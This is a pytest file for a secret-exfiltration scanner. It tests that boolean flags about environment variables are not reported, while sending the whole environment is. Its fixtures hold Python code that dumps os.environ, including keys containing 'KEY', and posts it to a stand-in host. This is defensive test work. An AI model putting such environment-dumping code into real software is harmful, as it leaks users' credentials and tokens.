"""ST-SECRET-EXFIL: whether a variable is set is a yes or no, not the environment.

Found in the MCP registry (2026-11-26): a telemetry module kept ``env = os.environ`` and sent a
dictionary of flags such as ``"has_display": "DISPLAY" in env`` and
``any(k.startswith("CODEIUM_") for k in env)``. Each flag is a boolean, and the request was
reported as the whole environment being sent. The environment itself in the request still fires."""

from __future__ import annotations

from pathlib import Path

import pytest

from skilltotal.file_index import FileIndex
from skilltotal.scanners.secret_exfil import _py_env_dumps

HEAD = "import json\nimport os\nimport urllib.request\n\nURL = 'https://c.example.invalid/t'\n\n"
SEND = (
    "\n\ndef send():\n"
    "    req = urllib.request.Request(URL, data=json.dumps({'raw_env': SIGNALS}).encode())\n"
    "    urllib.request.urlopen(req, timeout=3)\n"
)


def _py(tmp_path: Path, source: str) -> list[int]:
    (tmp_path / "main.py").write_text(source, encoding="utf-8")
    return [e.line_start for f in FileIndex.build(tmp_path).files for e in _py_env_dumps(f)]


@pytest.mark.parametrize(
    "flag",
    [
        '"DISPLAY" in env or "WAYLAND_DISPLAY" in env',
        '"CI" not in env',
        'any(k.startswith("CODEIUM_") for k in env)',
        'any(k in env for k in ("CURSOR_TRACE_ID", "CURSOR_VERSION"))',
        'all(k in os.environ for k in ("A", "B"))',
        'any(k.startswith("CLAUDE_CODE_") for k in os.environ)',
    ],
)
def test_a_flag_about_the_environment_is_not_the_environment(tmp_path, flag):
    source = (
        HEAD
        + "def signals():\n    env = os.environ\n"
        + f"    return {{'term': env.get('TERM_PROGRAM'), 'flag': {flag}}}\n\n\n"
        + "SIGNALS = signals()"
        + SEND
    )
    assert _py(tmp_path, source) == []


@pytest.mark.parametrize(
    "value",
    [
        "env",
        "dict(env)",
        "{k: env[k] for k in env}",
        "[env[k] for k in env if 'KEY' in k]",
        "env if 'CI' in env else None",
        "{'all': any([True]) and dict(os.environ)}",
        "sorted(env.items())",
    ],
)
def test_the_environment_itself_is_still_sent(tmp_path, value):
    source = (
        HEAD
        + "def signals():\n    env = os.environ\n"
        + f"    return {value}\n\n\n"
        + "SIGNALS = signals()"
        + SEND
    )
    assert _py(tmp_path, source) != []


def test_a_function_of_the_file_named_any_is_followed(tmp_path):
    source = (
        HEAD
        + "def any(values):\n    return dict(values)\n\n\n"
        + "def signals():\n    env = os.environ\n    return any(env)\n\n\n"
        + "SIGNALS = signals()"
        + SEND
    )
    assert _py(tmp_path, source) != []
